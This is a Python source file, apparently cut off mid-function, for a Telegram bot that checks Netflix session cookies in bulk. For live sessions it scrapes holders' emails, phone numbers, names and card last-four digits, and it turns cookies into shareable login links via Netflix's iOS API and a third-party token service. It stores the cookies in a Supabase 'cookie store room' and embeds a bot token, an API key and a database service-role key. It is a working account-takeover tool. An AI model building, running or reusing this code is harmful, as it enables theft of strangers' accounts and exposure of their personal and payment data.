import subprocess
import sys
import os

# ──────────────────────────────────────────────────────────────
# Auto-installer: called by main.py or directly when needed.
# Keeps quiet on success; prints only on failure.
# ──────────────────────────────────────────────────────────────

def _pip_install(*specs):
    """Try each spec in order; return True on first success."""
    for spec in specs:
        ret = subprocess.call(
            [sys.executable, "-m", "pip", "install", "--quiet", "--upgrade", spec],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if ret == 0:
            return True
    # Last attempt with visible output so the host logs show the error
    subprocess.call([sys.executable, "-m", "pip", "install", specs[-1]])
    return False

def bootstrap():
    """Install all runtime dependencies.  Safe to call multiple times."""
    # greenlet must come first, binary-only to prevent OOM compilation
    subprocess.call(
        [sys.executable, "-m", "pip", "install", "--quiet", "--only-binary", ":all:", "greenlet>=3.0.0"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    packages = [
        ("requests",),
        ("pyTelegramBotAPI",),
        ("flask",),
        ("colorama",),
        ("urllib3",),
        ("supabase==2.3.0", "supabase==1.2.0", "supabase==1.0.3", "supabase"),
    ]
    for specs in packages:
        try:
            _pip_install(*specs)
        except Exception as e:
            print(f"[bootstrap] WARNING: could not install {specs[0]}: {e}")

# ──────────────────────────────────────────────────────────────
# Run bootstrap when this file is imported directly (not via
# main.py which already called it).
# ──────────────────────────────────────────────────────────────
if os.environ.get("_BOOTSTRAP_DONE") != "1":
    bootstrap()
    os.environ["_BOOTSTRAP_DONE"] = "1"

import requests
import random
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
import uuid
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask
try:
    from supabase import create_client
except Exception:
    create_client = None

# Optional playwright (not required — TV login uses requests)
try:
    from playwright.sync_api import sync_playwright as _sync_playwright  # noqa: F401
    _PLAYWRIGHT_OK = True
except Exception:
    _PLAYWRIGHT_OK = False

# Suppress Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def _env_int(name: str, default: int) -> int:
    try:
        return int(os.environ.get(name, str(default)))
    except Exception:
        return default

def _env_csv(name: str, default: list) -> list:
    raw = (os.environ.get(name, "") or "").strip()
    if not raw:
        return list(default)
    vals = [v.strip() for v in raw.split(",") if v.strip()]
    return vals if vals else list(default)

def _env_int_set(name: str, default: list[int]) -> set[int]:
    vals = _env_csv(name, [str(v) for v in default])
    out = set()
    for v in vals:
        try:
            out.add(int(v))
        except ValueError:
            continue
    return out if out else set(default)

# Optional persistent data directory (mount this path in Docker, e.g. /data)
DATA_DIR = (os.environ.get("DATA_DIR", "") or "").strip()
if DATA_DIR:
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        os.chdir(DATA_DIR)
        print(f"[DATA] Using DATA_DIR={DATA_DIR}")
    except Exception as _data_err:
        print(f"[DATA] WARNING: could not use DATA_DIR={DATA_DIR}: {_data_err}")

user_modes = {}
bulk_access = {} # {user_id: expiry_timestamp}
user_daily_usage = {} # {user_id: {'date': 'YYYY-MM-DD', 'count': 0}}
bulk_results = {} # {chat_id: hits_list}
partial_hits = {} # {chat_id: [(res, cookie), ...]} — live hits during bulk scan for stop-button export
broadcast_log = [] # [{id, ts, preview, msg_ids: {uid_str: msg_id}}] — last 3 broadcasts
user_last_bot_msg = {} # {chat_id: message_id} — last single-check result msg for cleanup
banned_users = set()  # {user_id_str} — persisted to BANNED_FILE
BANNED_FILE = "banned.txt"
# Referral system — each entry: {uid_str: {"unlocked": bool, "referred_by": str|None, "referral_count": int, "referral_credited": bool}}
REFERRALS_FILE = "referrals.json"
_referrals: dict = {}
_referral_lock = threading.Lock()

def _load_referrals():
    global _referrals
    try:
        if os.path.exists(REFERRALS_FILE):
            with open(REFERRALS_FILE, "r") as f:
                _referrals = json.load(f)
    except Exception:
        _referrals = {}

def _save_referrals():
    try:
        with open(REFERRALS_FILE, "w") as f:
            json.dump(_referrals, f)
    except Exception:
        pass

def _get_referral(uid_str: str) -> dict:
    with _referral_lock:
        return dict(_referrals.get(uid_str, {"unlocked": False, "referred_by": None, "referral_count": 0, "referral_credited": False, "channel_verified": False}))

def _set_referral(uid_str: str, data: dict):
    with _referral_lock:
        _referrals[uid_str] = data
        _save_referrals()

_load_referrals()

BOT_TOKEN = "8237011220:AAFOwHySi_Y5Tq0OoOUgskgEIfAtOFaC1eM"
ADMIN_ID = 6176299339
ADMIN_IDS = {6176299339, 7383471237}


def is_admin(user_id: int | str) -> bool:
    try:
        return int(user_id) in ADMIN_IDS
    except (ValueError, TypeError):
        return False
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(6)
# Semaphore to limit concurrent browser-based cookie checks (20 browsers at once — add-cookie flow only)
BROWSER_SEMAPHORE = threading.Semaphore(20)
# Global Executor — large pool supports 10k concurrent users + 25 bulk threads each
GLOBAL_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=60)
# Cookie check limits
USER_DAILY_LIMIT = 10  # non-admin: max 10 cookie checks per day
USER_SINGLE_ONLY = True  # non-admin: only 1 cookie per check request
# ── FIFO Rate-Limited API Queue ─────────────────────────────────────────────
# NFToken.site API: 1 request per 2.5 seconds, strict FIFO queue
# iOS API: NO rate limit — used for NFToken link generation
# ────────────────────────────────────────────────────────────────────────────
import queue as _queue_module

_API_QUEUE = _queue_module.Queue()           # FIFO queue of (event, result_holder)
_API_RATE_INTERVAL = 2.2                      # seconds between API calls (NFToken limit = 1/2sec)
_api_queue_lock = threading.Lock()

def _api_worker():
    """Background thread: drain FIFO queue at 1 req/2.5s."""
    last_call = 0.0
    while True:
        try:
            event, holder = _API_QUEUE.get(timeout=60)
            # Enforce rate limit
            now = time.time()
            gap = _API_RATE_INTERVAL - (now - last_call)
            if gap > 0:
                time.sleep(gap)
            # Execute the API call stored in holder["func"]
            try:
                result = holder["func"]()
                holder["result"] = result
            except Exception as e:
                holder["result"] = {}
                holder["error"] = str(e)
            last_call = time.time()
            event.set()
        except _queue_module.Empty:
            continue
        except Exception:
            continue

# Start one background worker thread
_api_worker_thread = threading.Thread(target=_api_worker, daemon=True)
_api_worker_thread.start()

def _nftoken_api_call(nid: str, key: str = None) -> dict:
    """Queue an NFToken API call (FIFO, rate-limited). Returns API response dict or {}."""
    _key = key or NFTOKEN_KEY
    clean = f"NetflixId={nid}"
    event = threading.Event()
    holder = {"result": {}, "func": lambda: requests.post(
        NFTOKEN_API,
        json={"key": _key, "cookie": clean},
        timeout=12
    ).json()}
    _API_QUEUE.put((event, holder))
    event.wait(timeout=60)  # wait up to 60s for queue slot
    result = holder.get("result", {})
    return result if isinstance(result, dict) else {}

def _nftoken_tv_call(nid: str, code: str, key: str = None) -> dict:
    """Queue an NFToken TV API call (FIFO, rate-limited 2.2s gap)."""
    _key = key or NFTOKEN_KEY

    def _do_tv_call():
        resp = requests.post(
            "https://nftoken.site/v1/tv.php",
            json={"key": _key, "cookie": f"NetflixId={nid}", "tv_code": code},
            timeout=25,
            headers={"Content-Type": "application/json"}
        )
        # Try JSON parse
        try:
            return resp.json()
        except Exception:
            # Try stripping BOM / whitespace then parse
            raw = resp.text.strip().lstrip('\ufeff')
            if raw:
                try:
                    return json.loads(raw)
                except Exception:
                    pass
            print(f"[TV] raw response (status={resp.status_code}): {raw[:200]}")
            return {}

    event = threading.Event()
    holder = {"result": {}, "func": _do_tv_call}
    _API_QUEUE.put((event, holder))
    event.wait(timeout=90)
    result = holder.get("result", {})
    if holder.get("error"):
        print(f"[TV] worker error: {holder['error']}")
    if isinstance(result, dict):
        if result.get("status") != "SUCCESS":
            print(f"[TV] tv.php result: {result}")
        return result
    return {}

# ── iOS NFToken Link Generation (NO rate limit!) ──────────────────────────────
IOS_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
IOS_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","cdsMyListSortEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.context.ui-flavor": "argo",
}

def gen_ios_nftoken(nid: str):
    """
    Generate NFToken via iOS API — NO rate limit, works for 100+ concurrent users.
    Returns (token_str, expiry_str) or (None, error_str).
    """
    import urllib3
    urllib3.disable_warnings()
    headers = dict(IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={nid}"
    try:
        r = requests.get(IOS_API_URL, params=IOS_PARAMS, headers=headers, timeout=25, verify=False)
        if r.status_code == 200:
            data = r.json()
            td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            token = td.get("token")
            expires = td.get("expires")
            if token:
                if isinstance(token, dict):
                    token = token.get("value") or ""
                token = urllib.parse.unquote(str(token))
                # Expiry string
                exp_str = "~1 hour"
                try:
                    ts = int(expires)
                    if len(str(abs(ts))) == 13: ts //= 1000
                    exp_str = datetime.fromtimestamp(ts).strftime("%H:%M %d %b")
                except Exception: pass
                return token, exp_str
        return None, f"iOS API {r.status_code}"
    except Exception as e:
        return None, str(e)[:50]

def ios_nftoken_links(token: str):
    """Build PC + Mobile + TV links from iOS NFToken."""
    if not token: return None, None, None
    return (
        f"https://netflix.com/?nftoken={token}",
        f"https://netflix.com/unsupported?nftoken={token}",
        f"https://netflix.com/?nftoken={token}",
    )

# Semaphore kept for legacy compat (no longer rate-limits API)
API_SEMAPHORE = threading.Semaphore(100)

# Circuit-breaker for the NFTOKEN API.
# After _API_FAIL_THRESHOLD consecutive failures we stop trying the API for
# _API_COOLDOWN_SECS seconds so bulk checks don't waste time retrying a
# service that's clearly down.
_api_fail_count = 0
_api_fail_lock = threading.Lock()
_api_down_until = 0.0          # epoch timestamp; 0 means "not in cooldown"
_API_FAIL_THRESHOLD = 5        # failures before circuit opens
_API_COOLDOWN_SECS  = 120      # seconds to stay in open state

def _api_circuit_open() -> bool:
    """Return True when the circuit breaker has tripped (API treated as down)."""
    return time.time() < _api_down_until

def _api_record_failure():
    global _api_fail_count, _api_down_until
    with _api_fail_lock:
        _api_fail_count += 1
        if _api_fail_count >= _API_FAIL_THRESHOLD:
            _api_down_until = time.time() + _API_COOLDOWN_SECS
            _api_fail_count = 0

def _api_record_success():
    global _api_fail_count, _api_down_until
    with _api_fail_lock:
        _api_fail_count = 0
        _api_down_until = 0.0

app = Flask(__name__)

@app.route('/')
def home():
    return "Stable Scraper is Running 24/7"

@app.route('/health')
def health():
    return {
        "status": "ok",
        "api_worker_alive": bool(_api_worker_thread.is_alive()),
        "api_circuit_open": bool(_api_circuit_open())
    }, 200

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
}

# API Configuration
NFTOKEN_API = "https://nftoken.site/v1/api.php"
NFTOKEN_KEY = "NFK_dda3ee3932171d33d94067e3"
NFTOKEN_KEY_POOL = ["NFK_dda3ee3932171d33d94067e3"]
_key_counter = 0
_key_counter_lock = threading.Lock()

def _pick_api_key():
    global _key_counter
    with _key_counter_lock:
        if not NFTOKEN_KEY_POOL:
            return None
        key = NFTOKEN_KEY_POOL[_key_counter % len(NFTOKEN_KEY_POOL)]
        _key_counter += 1
        return key

SECRET_KEY = ""
API_BASE_URL = ""

# ─── Minimal Supabase REST client (no supabase SDK required) ─────────────────
# Used as automatic fallback when the supabase Python package is unavailable or
# fails to initialize (e.g. on justrunmy.app where package installs sometimes
# fail silently).  Implements the same fluent interface used by the code below.
class _SupabaseFallback:
    """Pure-requests Supabase REST client — no supabase SDK required."""

    class _Result:
        def __init__(self, data=None, count=None):
            self.data = data if data is not None else []
            self.count = count

    class _Query:
        def __init__(self, base_url, base_headers, table_name):
            self._url     = f"{base_url}/rest/v1/{table_name}"
            self._headers = dict(base_headers)
            self._params  = {}
            self._op      = "select"
            self._body    = None
            self._select  = "*"

        def select(self, cols="*", count=None):
            self._select = cols
            if count:
                self._headers["Prefer"] = f"count={count}"
            return self

        def insert(self, row):
            self._op   = "insert"
            self._body = row
            self._headers["Prefer"] = "return=representation"
            return self

        def delete(self):
            self._op = "delete"
            return self

        def eq(self, col, val):
            self._params[col] = f"eq.{val}"
            return self

        def gte(self, col, val):
            self._params[col] = f"gte.{val}"
            return self

        def limit(self, n):
            self._params["limit"] = str(n)
            return self

        def order(self, col, *args, **kwargs):
            self._params["order"] = col
            return self

        def range(self, start, end):
            self._headers["Range"] = f"{start}-{end}"
            return self

        def execute(self):
            if self._op == "insert":
                r = requests.post(self._url, json=self._body,
                                  headers=self._headers, timeout=15)
                try:
                    r.raise_for_status()
                except Exception as e:
                    raise Exception(f"DB insert error {r.status_code}: {r.text}") from e
                d = r.json()
                return _SupabaseFallback._Result(d if isinstance(d, list) else [d])

            if self._op == "delete":
                r = requests.delete(self._url, params=self._params,
                                    headers=self._headers, timeout=15)
                try:
                    r.raise_for_status()
                except Exception as e:
                    raise Exception(f"DB delete error {r.status_code}: {r.text}") from e
                return _SupabaseFallback._Result([])

            # SELECT
            self._params["select"] = self._select
            r = requests.get(self._url, params=self._params,
                             headers=self._headers, timeout=15)
            try:
                r.raise_for_status()
            except Exception as e:
                raise Exception(f"DB select error {r.status_code}: {r.text}") from e
            data  = r.json() if r.text else []
            count = None
            if "Content-Range" in r.headers:
                try:
                    count = int(r.headers["Content-Range"].split("/")[-1])
                except Exception:
                    pass
            return _SupabaseFallback._Result(data, count)

    class _Rpc:
        def __init__(self, base_url, base_headers, name, params):
            self._url     = f"{base_url}/rest/v1/rpc/{name}"
            self._headers = base_headers
            self._params  = params

        def execute(self):
            r = requests.post(self._url, json=self._params,
                              headers=self._headers, timeout=10)
            try:
                r.raise_for_status()
            except Exception as e:
                raise Exception(f"DB rpc error {r.status_code}: {r.text}") from e
            return _SupabaseFallback._Result(r.json() if r.text else [])

    def __init__(self, url, key):
        self._url  = url.rstrip("/")
        self._hdrs = {
            "apikey":        key,
            "Authorization": f"Bearer {key}",
            "Content-Type":  "application/json",
        }

    def table(self, name):
        return self._Query(self._url, self._hdrs, name)

    def rpc(self, name, params):
        return self._Rpc(self._url, self._hdrs, name, params)


# New Supabase project — COOKIE STORE ROOM
S_URL = "https://gzmnobdckgtisbzinvxz.supabase.co"
S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6bW5vYmRja2d0aXNiemludnh6Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NTYyOTY4NCwiZXhwIjoyMDkxMjA1Njg0fQ.vuWv7jqV1Q-X-23vmGBqZf8tj_GB4doD4WI_qSX4pP8"

# Try the official supabase SDK first; fall back to our minimal REST client so
# the bot never shows "Database not configured" just because the SDK is absent.
try:
    supabase = create_client(S_URL, S_KEY) if (create_client and S_URL and S_KEY) else None
except Exception:
    supabase = None

if supabase is None and S_URL and S_KEY:
    try:
        supabase = _SupabaseFallback(S_URL, S_KEY)
        print("[DB] supabase SDK unavailable — using built-in REST fallback client.")
    except Exception as _fb_err:
        supabase = None
        print(f"[DB] WARNING: could not init any DB client: {_fb_err}")
elif not S_URL or not S_KEY:
    print("[DB] WARNING: SUPABASE_URL/SUPABASE_KEY not set. DB features disabled.")

# Ensure the netflix cookie-store table exists (creates once, safe to re-run).
# If the table is missing the PGRST205 error is suppressed below.
_db_table_ready = False
def _ensure_db_table():
    global _db_table_ready
    if _db_table_ready or not supabase:
        return
    try:
        # Quick probe — raises if table is missing
        supabase.table('netflix').select("id").limit(1).execute()
        _db_table_ready = True
    except Exception as e:
        err_str = str(e)
        if ('PGRST205' in err_str or 'schema cache' in err_str or
                'does not exist' in err_str or '"42P01"' in err_str or
                '404' in err_str or '400' in err_str):
            # Table absent — attempt to create via raw SQL through the REST API
            try:
                supabase.rpc('exec_sql', {
                    'query': (
                        "CREATE TABLE IF NOT EXISTS public.netflix "
                        "(id BIGSERIAL PRIMARY KEY, data TEXT NOT NULL, "
                        "created_at TIMESTAMPTZ DEFAULT NOW());"
                    )
                }).execute()
                _db_table_ready = True
                print("[DB] 'netflix' table created successfully.")
            except Exception as ce:
                # exec_sql RPC not available — admin must create the table manually.
                print(
                    "[DB] ⚠️  Table 'public.netflix' not found.\n"
                    "     Run this in your Supabase SQL Editor:\n\n"
                    "     CREATE TABLE IF NOT EXISTS public.netflix\n"
                    "       (id BIGSERIAL PRIMARY KEY, data TEXT NOT NULL,\n"
                    "        created_at TIMESTAMPTZ DEFAULT NOW());\n"
                )
        else:
            _db_table_ready = True  # some other transient error; don't loop

_ensure_db_table()

CURRENCY_MAP = {
    "US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", 
    "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", 
    "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", 
    "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", 
    "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", 
    "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", 
    "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", 
    "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei",
    "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"
}

def get_flag(code):
    if not code or code == "Unknown" or len(code) != 2: return "🌍"
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def get_currency_symbol(code):
    return CURRENCY_MAP.get(code, "$")

def clean_text(text):
    if not text: return "Unknown"
    try: return codecs.decode(text, 'unicode_escape')
    except: return text

def unix_to_date(timestamp):
    try:
        ts = int(timestamp)
        if ts > 1e12: ts = ts / 1000
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
    except: return "N/A"

def calculate_duration(member_since_str):
    try:
        since_date = datetime.strptime(member_since_str, '%Y-%m-%d')
        diff = datetime.now() - since_date
        return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
    except: return ""

def get_daily_usage(uid):
    today = datetime.now().strftime('%Y-%m-%d')
    if uid not in user_daily_usage:
        user_daily_usage[uid] = {'date': today, 'count': 0}
    data = user_daily_usage[uid]
    if data['date'] != today:
        data['date'] = today
        data['count'] = 0
    return data['count']

def increment_daily_usage(uid, count=1):
    today = datetime.now().strftime('%Y-%m-%d')
    if uid not in user_daily_usage:
        user_daily_usage[uid] = {'date': today, 'count': 0}
    data = user_daily_usage[uid]
    if data['date'] != today:
        data['date'] = today
        data['count'] = 0
    data['count'] += count

def extract_deep_details(html):
    details = {
        "plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A", 
        "phone": "N/A", "country": "Unknown", "price": "Unknown", "quality": "Unknown", 
        "name": "Unknown", "extra_members": "No ❌", "member_since": "Unknown", 
        "member_duration": "", "profiles": [], "status": "Unknown", "has_ads": "No ❌",
        "max_streams": "Unknown",
        "email_verified": "No ❌", "phone_verified": "No ❌", "auto_payment": "No ❌"
    }
    
    try:
        # Status
        if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html: details["status"] = "Active"
        elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html: details["status"] = "Expired"
        elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html: details["status"] = "Free/Never Paid"
        
        # Plan
        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if plan_match: details["plan"] = clean_text(plan_match.group(1))
        elif re.search(r'"currentPlanName":"([^"]+)"', html): details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
        elif re.search(r'data-uia="plan-label">([^<]+)<', html): details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
        
        if "with ads" in str(details["plan"]).lower(): details["has_ads"] = "Yes ✅"

        # Quality
        qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if qual_match: details["quality"] = clean_text(qual_match.group(1))

        # Refine Quality & Max Streams
        plan_lower = str(details["plan"]).lower()
        if "premium" in plan_lower: details["max_streams"] = "4"
        elif "standard" in plan_lower: details["max_streams"] = "2"
        elif "basic" in plan_lower or "mobile" in plan_lower: details["max_streams"] = "1"

        if details["quality"] == "Unknown" or "HD" in details["quality"] or "SD" in details["quality"]:
            if "premium" in plan_lower: details["quality"] = "UHD 4K"
            elif "standard" in plan_lower: details["quality"] = "Full HD (1080p)"
            elif "basic" in plan_lower: details["quality"] = "HD (720p)"
            elif "mobile" in plan_lower: details["quality"] = "SD (480p)"

        # Price
        price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if price_match: details["price"] = clean_text(price_match.group(1))
        else:
            loc_price = re.search(r'"localizedPrice":"([^"]+)"', html)
            if loc_price: details["price"] = clean_text(loc_price.group(1))
            elif re.search(r'data-uia="plan-price">([^<]+)<', html): details["price"] = clean_text(re.search(r'data-uia="plan-price">([^<]+)<', html).group(1))

        # Payment
        pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if pm_match: details["payment"] = clean_text(pm_match.group(1))
        elif re.search(r'data-uia="payment-method">([^<]+)<', html): details["payment"] = clean_text(re.search(r'data-uia="payment-method">([^<]+)<', html).group(1))
        else:
            if "Visa" in html: details["payment"] = "Visa 💳"
            elif "MasterCard" in html: details["payment"] = "MasterCard 💳"
            elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
            elif "Amex" in html: details["payment"] = "Amex 💳"
            elif "DCB" in html: details["payment"] = "Mobile Bill (DCB) 📱"
            elif "Direct Debit" in html: details["payment"] = "Direct Debit 🏦"
            elif "UPI" in html: details["payment"] = "UPI 📱"
        
        # Try to find last 4 digits
        last4 = re.search(r'"last4":"(\d+)"', html)
        if not last4:
             last4 = re.search(r'data-uia="payment-last4">.*?(\d{4})<', html)
        
        if last4 and "Unknown" not in details["payment"]:
             details["payment"] += f" (**** {last4.group(1)})"

        # Name
        name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
        if name_match: details["name"] = clean_text(name_match.group(1))
        elif re.search(r'"firstName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
        elif re.search(r'data-uia="account-owner-name">([^<]+)<', html): details["name"] = clean_text(re.search(r'data-uia="account-owner-name">([^<]+)<', html).group(1))

        # Email
        email_match = re.search(r'"email":"([^"]+)"', html)
        if email_match: details["email"] = clean_text(email_match.group(1))
        else:
            uc_match = re.search(r'"userContext":\{[^}]*"email":"([^"]+)"', html)
            if uc_match: details["email"] = clean_text(uc_match.group(1))
            else:
                login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
                if login_id_match: details["email"] = clean_text(login_id_match.group(1))
                elif re.search(r'data-uia="account-email">([^<]+)<', html): details["email"] = clean_text(re.search(r'data-uia="account-email">([^<]+)<', html).group(1))
                elif re.search(r'"emailAddress":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"emailAddress":"([^"]+)"', html).group(1))

        if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"

        # Phone
        phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
        if phone_match: 
            details["phone"] = clean_text(phone_match.group(1))
            details["phone_verified"] = "Yes ✅"
        elif re.search(r'data-uia="account-phone">([^<]+)<', html):
             details["phone"] = clean_text(re.search(r'data-uia="account-phone">([^<]+)<', html).group(1))
             details["phone_verified"] = "Yes ✅"

        # Expiry
        bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if bill_match: details["expiry"] = clean_text(bill_match.group(1))
        elif re.search(r'data-uia="next-billing-date">([^<]+)<', html): 
            details["expiry"] = clean_text(re.search(r'data-uia="next-billing-date">([^<]+)<', html).group(1))

        if details["expiry"] != "N/A":
             details["auto_payment"] = "Yes ✅"
        if "renewalDate" in html:
             details["auto_payment"] = "Yes ✅"

        # Member Since
        since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if since_match:
            details["member_since"] = unix_to_date(since_match.group(1))
            details["member_duration"] = calculate_duration(details["member_since"])
        elif "memberSince" in html:
             ms_ui = re.search(r'data-uia="member-since">.*?Member Since ([^<]+)', html)
             if ms_ui: details["member_since"] = clean_text(ms_ui.group(1))

        # Country
        country_match = re.search(r'"currentCountry":"([^"]+)"', html)
        if country_match: details["country"] = country_match.group(1)

        # Extra Members
        extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
        if extra_match and extra_match.group(1) == "true": details["extra_members"] = "Yes (Slot Available)"
        elif "extraMember" in html or "Extra Member" in html or "extra-member" in html: details["extra_members"] = "Yes (Slot Available)"

        # Profiles
        p_names = re.findall(r'"profileName":"([^"]+)"', html)
        if p_names: details["profiles"] = list(set([clean_text(p) for p in p_names]))
        if not details["profiles"]:
             ui_profiles = re.findall(r'class="profile-name">([^<]+)<', html)
             if ui_profiles: details["profiles"] = list(set([clean_text(p) for p in ui_profiles]))
        
        if not details["profiles"]:
             avatars = re.findall(r'"avatarName":"([^"]+)"', html)
             if avatars: details["profiles"] = list(set([clean_text(p) for p in avatars]))
        
        # Filter out "Add Profile" buttons
        if details["profiles"]:
            details["profiles"] = [p for p in details["profiles"] if p not in ["Add Profile", "Add", "New Profile", "add-profile"]]

    except: pass
    return details

def call_api(endpoint, payload):
    try:
        payload["secret_key"] = SECRET_KEY
        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=8)
        return resp.json()
    except: return None

# Signals that indicate the page is showing an authenticated account
def _check_netflix_session(nid):
    """Direct Netflix validity check — no Playwright, no NFTOKEN API.

    Uses HTTP redirect detection instead of HTML parsing.  Netflix serves its
    pages as a React SPA so a plain HTTP GET only receives an empty HTML shell
    (account data is loaded by JavaScript afterwards).  Checking text signals in
    that shell is unreliable.  Redirect detection is reliable:

      • GET /browse  allow_redirects=False
          200       → user is logged in  ✅
          302/301 to /login/* → cookie is dead ❌
          302/301 to elsewhere (regional redirect) → follow once, repeat check

    As a secondary cross-check we also inspect the final URL after following all
    redirects on /YourAccount.

    Returns: (is_valid: bool, html: str | None)
    """
    try:
        with requests.Session() as s:
            s.headers.update(HEADERS)
            s.cookies.set("NetflixId", nid, domain=".netflix.com")

            # ── Primary: redirect-status check on /browse ─────────────────
            r = s.get("https://www.netflix.com/browse", timeout=8, allow_redirects=False)

            if r.status_code == 200:
                # Already on browse page → authenticated
                return True, r.text

            loc = r.headers.get("Location", "").lower()
            if r.status_code in (301, 302, 303, 307, 308):
                if "login" in loc or "signup" in loc:
                    return False, None
                # Regional or HTTPS redirect — follow it once
                try:
                    r2 = s.get("https://www.netflix.com/browse", timeout=8, allow_redirects=True)
                    final_url = str(r2.url).lower()
                    if "login" in final_url or "signup" in final_url:
                        return False, None
                    if r2.status_code == 200:
                        return True, r2.text
                except Exception:
                    pass
                return False, None

            # ── Secondary: final-URL check on /YourAccount ────────────────
            try:
                r3 = s.get("https://www.netflix.com/YourAccount", timeout=8, allow_redirects=True)
                final_url = str(r3.url).lower()
                if "login" in final_url or "signup" in final_url:
